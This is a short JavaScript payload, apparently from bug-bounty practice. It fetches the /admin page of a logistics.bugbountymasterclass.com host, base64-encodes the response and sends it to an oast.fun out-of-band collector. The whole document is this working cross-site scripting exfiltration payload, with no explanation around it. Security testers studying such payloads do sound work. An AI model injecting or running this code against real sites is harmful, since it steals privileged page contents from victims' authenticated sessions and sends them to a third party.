fetch('https://logistics.bugbountymasterclass.com/admin')
.then(r=>r.text())
.then(d=>fetch('https://bhjwrunrspfmjpqiwmuellyqnu31d7qax.oast.fun/?d='+btoa(d)))
